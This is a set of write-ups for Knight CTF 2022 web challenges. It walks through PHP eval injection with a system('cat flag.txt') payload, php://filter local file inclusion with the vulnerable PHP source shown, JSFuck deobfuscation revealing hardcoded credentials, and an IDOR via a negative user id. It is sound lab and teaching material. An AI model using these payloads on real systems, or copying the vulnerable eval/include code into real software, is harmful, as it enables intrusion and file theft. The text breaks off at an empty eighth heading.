# Knight-CTF-22-Writeups
Writeups of web challenges

# 1. Do something special
## Challenge Description:
Alex is trying to get a flag from this website. But something is wrong with the button. Can you help him to get the flag?
Link: http://do-something-special.kshackzone.com/

## Solution:
+ When we view the page source we can find:
   <a href="/gr@b_y#ur_fl@g_h3r3!" class="button btn btn-lg btn-success">Get the flag!</a>
 + When the url encode this link :` gr@b_y#ur_fl@g_h3r3! ` , we get this: gr%40b_y%23ur_fl%40g_h3r3!
 + When we give the encoded link with the url : https://do-something-special.kshackzone.com/gr%40b_y%23ur_fl%40g_h3r3!
 + Thus we get the flag: `KCTF{Sp3cial_characters_need_t0_get_Url_enc0ded}`

# 2. Most secure calculator-1
## Challenge description

link: http://198.211.115.81:9003/
Hint: Hi Selina, 
        I learned about eval today and tomorrow I will learn about regex. I have build a calculator for your child.
        I have hidden some interesting things in flag.txt and I know you can read that file.

## solution:
+ The webpage uses 'eval' to do calculations
+ Flag is stored in flag.txt
+ Submitting 'system("cat flag.txt");' gives us the flag
+ ```Flag: KCTF{WaS_mY_cAlCuLaToR_sAfE}```


## Reference:
+ PHP Eval: https://www.php.net/manual/en/function.eval.php
+ system() in php: https://www.php.net/manual/en/function.system.php

# 3. My PHP Site
## Challenge Description:
Try to find the flag from the website.
N:B: I'm a n00b developer.
link: http://137.184.133.81:15002/?file=index.html

#Solution:
+ Here we use `php://filter` for local file inclusion
+ Above link is a site made of php. So we use `php://filter/convert.base64-encode/resource=index.php`, which allowed me to view the source page of the php file
+ link: http://137.184.133.81:15002/?file=php://filter/convert.base64-encode/resource=index.php
+ We get a base64 encoded string from the above link, which looks like this:
```
  PD9waHAKCmlmKGlzc2V0KCRfR0VUWydmaWxlJ10pKXsKICAgIGlmICgkX0dFVFsnZmlsZSddID09ICJpbmRleC5waHAiKSB7CiAgICAgICAgZWNobyAiPGgxPkVSUk9SISE8L2gxPiI7CiAgICAgICAgZGllKCk7CiAgICB9ZWxzZXs
  KICAgICAgICBpbmNsdWRlICRfR0VUWydmaWxlJ107CiAgICB9Cgp9ZWxzZXsKICAgIGVjaG8gIjxoMT5Zb3UgYXJlIG1pc3NpbmcgdGhlIGZpbGUgcGFyYW1ldGVyPC9oMT4iOwoKICAgICNub3RlIDotIHNlY3JldCBsb2NhdGlvbi
  AvaG9tZS90YXJlcS9zM2NyRXRfZmw0OS50eHQKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db
  21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5UYXJlcSdzIEhvbWUgUGFn
  ZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjwvYm9keT4KPC9odG1sPgo=
  ```
 
+ We when decode it using base64 decoder, we obtain the below php code:
```
  <?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tareq's Home Page</title>
</head>
<body>
</body>
</html>
```
+ In the above code, we can see "` #note :- secret location /home/tareq/s3crEt_fl49.txt"`
+ The we give the url file parameter as : http://137.184.133.81:15002/?file=s3crEt_fl49.txt
+ Thus obtained the` flag: KCTF{L0C4L_F1L3_1ncLu710n}`



## Reference:
https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

# 4.Obsfuscation Isn't Enough
## Challenge Description:
One of my friend developed this login panel and dared me to get the flag by logging in. I tired to bruteforce the login panel. But it doesn't work at all. Can you please figure
out the login credentials or something more valuable for me?
link: http://obsfication.kshackzone.com/

# Solution:
+ As suggested in the hint, we check for the source parameter.
  https://find-pass-code-one.kshackzone.com/?source
+ There we can see a javascript code which is jsfuck encoded
+ We decode the encoded code and obtain the following decoded javascript code.
  ```
  if (document.forms[0].username.value == "83fe2a837a4d4eec61bd47368d86afd6" && document.forms[0].password.value == "a3fa67479e47116a4d6439120400b057") 
  document.location = "150484514b6eeb1d99da836d95f6671d.php"
  ```
+ We get the document location from the above code and give it in the url as follows:
  ` https://obsfication.kshackzone.com/150484514b6eeb1d99da836d95f6671d.php `
+ Thus we obtain the ` flag: KCTF{0bfuscat3d_J4v4Scr1pt_aka_JSFuck} `

# 5. Sometimes we need to look way back
## Challenge Descritpion
` Link:http://wayback.kshackzone.com/index.html `

# Solution:
+The challenge opens to a dicord.js application
+ When we view the page source we can find a a github link: https://github.com/KCTF202x/repo101
+ We will look for the commits for the github link: https://github.com/KCTF202x/repo101/commits
+ There we obtained the ` flag: KCTF{version_control_is_awesome} `

# 6. Zero is not the limit
## Challenge Description

`Challenge link: http://198.211.115.81:5001/`

Hint: You have to think out side from '/user/'.

## Solution:
+ We can see a set of username and password with id 1 to 4
+ When we gave the url : `http://198.211.115.81:5001/user/1`, it gave the username and password of id=1
  Similarly it gives the username and password for id=2,3,4
+ As we gave `http://198.211.115.81:5001/user/0` nothing pops up
+ As the title of the challenges says zero is no the limit we look into negative values
+ When we gave the url as `http://198.211.115.81:5001/user/-1` we obtained the flag.
+ `Flag:KCTF{tHeRe_1s_n0_l1m1t}`

# 7.

